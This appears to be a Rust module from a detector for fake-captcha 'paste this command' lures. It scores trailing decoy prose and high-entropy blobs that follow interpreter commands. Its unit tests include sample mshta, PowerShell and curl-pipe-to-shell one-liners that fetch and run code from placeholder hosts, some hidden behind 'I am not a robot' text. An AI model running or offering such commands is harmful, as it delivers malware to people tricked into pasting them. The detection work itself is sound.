//! Feature extraction. Each feature is independent and returns a weight contribution.

use crate::rules::{FeatureClass, RuleSet};
use crate::util::{has_interpreter_token, re, shannon_entropy, snippet};
use regex::Regex;
use serde::Serialize;
use std::sync::LazyLock;

#[derive(Debug, Clone, Serialize)]
pub struct Hit {
    pub feature: String,
    pub class: FeatureClass,
    pub weight: f64,
    /// 0 = raw text, 1.. = decoded layers.
    pub layer: usize,
    /// Short excerpt around the match. Only surfaced for warn+ verdicts.
    pub evidence: String,
}

/// Evaluate every regex rule plus the text-local computed features on one layer.
pub fn evaluate_layer(rules: &RuleSet, text: &str, layer: usize) -> Vec<Hit> {
    let mut hits = Vec::new();
    for rule in &rules.rules {
        if let Some((s, e)) = rule.matches(text) {
            hits.push(Hit {
                feature: rule.id.clone(),
                class: rule.class,
                weight: rule.weight,
                layer,
                evidence: snippet(text, s, e),
            });
        }
    }
    if let Some(ev) = trailing_decoy_prose(text) {
        hits.push(Hit {
            feature: "trailing_decoy_prose".into(),
            class: FeatureClass::Structural,
            weight: rules.computed.trailing_decoy_prose.weight,
            layer,
            evidence: ev,
        });
    }
    let ent = &rules.computed.interpreter_entropy;
    if let Some(ev) = gated_entropy(text, ent.min_token_len, ent.min_bits) {
        hits.push(Hit {
            feature: "interpreter_entropy".into(),
            class: FeatureClass::Behavioral,
            weight: ent.weight,
            layer,
            evidence: ev,
        });
    }
    hits
}

static DECOY_KEYWORDS: LazyLock<Regex> = LazyLock::new(|| {
    re(
        r"robot|human|captcha|verif|identificator|identifier|validation|cloudflare|ray\s*id|product\s*key|activation|i\s+am\s+not|\bid\s*[:#]|confirm|press\s+enter|security\s+check|access\s+code|authenticat|\bfix\b|update\s+(?:id|code)|reference|✅|✔",
    )
});
// `[^\S\r\n]` is whitespace other than a line break: the separator must sit on the same
// line as the command, or the newline + indentation of any pretty-printed output reads
// as decoy padding.
static SPLIT: LazyLock<Regex> =
    LazyLock::new(|| re(r"[^\S\r\n]#|[^\S\r\n]::[^\S\r\n]|[^\S\r\n]+rem[^\S\r\n]|[^\S\r\n]{8,}"));

/// Blank lines between a command and its final line that count as hiding the command.
const MIN_PADDING_BLANK_LINES: usize = 3;

fn prose_words(s: &str) -> usize {
    s.split(|c: char| !c.is_alphanumeric())
        .filter(|w| {
            w.len() >= 2 && w.chars().filter(|c| c.is_alphabetic()).count() * 10 >= w.len() * 6
        })
        .count()
}

/// Executable portion followed by human-facing prose meant for the victim's eyes (the
/// Run dialog shows only the tail of a long line). Requires an interpreter token in the
/// head so a plain `ls # list files` never fires.
///
/// Head and tail are compared within one line, so an interpreter named on one line of a
/// transcript or JSON document says nothing about text on a later line. The only
/// multi-line shape that counts is a command followed by a single final line of prose:
/// either two non-blank lines, or a last line pushed down by a run of blank lines.
pub fn trailing_decoy_prose(text: &str) -> Option<String> {
    let t = text.trim_end();
    let lines: Vec<&str> = t.split(['\n', '\r']).collect();
    for line in &lines {
        for m in SPLIT.find_iter(line) {
            if !has_interpreter_token(&line[..m.start()]) {
                continue;
            }
            let tail = &line[m.start()..];
            if prose_words(tail) >= 3
                && (DECOY_KEYWORDS.is_match(tail) || tail.contains("        "))
            {
                return Some(tail.trim().chars().take(80).collect());
            }
        }
    }

    let last_idx = lines.iter().rposition(|l| !l.trim().is_empty())?;
    let last = lines[last_idx];
    let before = &lines[..last_idx];
    let commands = before.iter().filter(|l| !l.trim().is_empty()).count();
    let blank_run = before
        .iter()
        .rev()
        .take_while(|l| l.trim().is_empty())
        .count();
    if (commands == 1 || (commands > 1 && blank_run >= MIN_PADDING_BLANK_LINES))
        && before.iter().any(|l| has_interpreter_token(l))
        && prose_words(last) >= 3
        && DECOY_KEYWORDS.is_match(last)
    {
        return Some(last.trim().chars().take(80).collect());
    }
    None
}

// `:` splits too: base64 and hex never contain it, while ARNs, image references and
// similar colon-delimited identifiers would otherwise read as one high-entropy blob.
static TOKEN_SPLIT: LazyLock<Regex> = LazyLock::new(|| re(r#"[\s'"(),;:|&<>`{}\[\]]+"#));

/// Entropy contributes only when an interpreter token is present in the same observation.
/// JWTs, PEM blocks, .env values and minified JS are high entropy and benign.
pub fn gated_entropy(text: &str, min_len: usize, min_bits: f64) -> Option<String> {
    if !has_interpreter_token(text) {
        return None;
    }
    TOKEN_SPLIT
        .split(text)
        .filter(|t| t.len() >= min_len)
        .find(|t| shannon_entropy(t) >= min_bits)
        .map(|t| {
            format!(
                "{}… ({:.2} bits)",
                t.chars().take(24).collect::<String>(),
                shannon_entropy(t)
            )
        })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn decoy_prose() {
        assert!(trailing_decoy_prose("mshta https://c2.invalid/v.mp4 # ✅ ''I am not a robot - reCAPTCHA Verification ID: 2165''").is_some());
        assert!(trailing_decoy_prose("powershell -w h -c \"iex(irm c2.invalid/a)\"                                   Cloud Identificator: 2031 press enter").is_some());
        assert!(trailing_decoy_prose("ls -la # list all files here").is_none());
        assert!(trailing_decoy_prose("bash build.sh # build it").is_none());
    }

    #[test]
    fn decoy_prose_across_lines() {
        // A final line of prose after a single command still counts.
        assert!(trailing_decoy_prose(
            "bash -c 'curl x.invalid/a | sh'\n# I am not a robot verification"
        )
        .is_some());
        assert!(trailing_decoy_prose(
            "bash -c 'curl x.invalid/a | sh'\n\n\n\n\n\n     Cloud Identificator: 2031 press enter"
        )
        .is_some());
        assert!(trailing_decoy_prose(
            "cd /tmp\nbash -c 'curl x.invalid/a | sh'\n\n\n\n# I am not a robot verification"
        )
        .is_some());
        // A command with no prose after it does not.
        assert!(trailing_decoy_prose("bash -c 'curl x.invalid/a | sh'\n\n\n\n").is_none());
    }

    #[test]
    fn pretty_printed_output_is_not_decoy_padding() {
        // Interpreter named in one JSON field, deeper indentation and prose-like words later.
        let transcript = r#"~ $ aws lambda get-function-configuration --function-name f
{
    "run": "python3.13",
    "role": "arn:aws:iam::111122223333:role/example-password-recovery-trigger",
    "env": [
        "REVOCATION_BUCKET",
        "USER_POOL_ID"
    ]
}
~ $ aws lambda get-policy --function-name f --query Policy --output text | jq .
{
  "Statement": [
    {
      "Sid": "CognitoRecoveryInvoke",
      "Action": "lambda:InvokeFunction",
      "Condition": {
        "StringEquals": {
          "AWS:SourceAccount": "111122223333"
        }
      }
    }
  ]
}"#;
        assert!(trailing_decoy_prose(transcript).is_none());
        assert!(gated_entropy(transcript, 32, 4.5).is_none());
    }

    #[test]
    fn entropy_ignores_colon_delimited_identifiers() {
        let arn = "python3 run.py arn:aws:lambda:us-east-1:111122223333:function:example-password-recovery";
        assert!(gated_entropy(arn, 32, 4.5).is_none());
    }

    #[test]
    fn entropy_gate() {
        let jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
        assert!(gated_entropy(jwt, 32, 4.5).is_none());
        assert!(gated_entropy(
            &format!(
                "powershell -enc {}",
                "H4sIAAAAAAAEAMtIzcnJVyjPL8pJAQCFEUoNCwAAAJx3Kq9Zb8Rm2Tw1pQ"
            ),
            32,
            4.5
        )
        .is_some());
    }
}
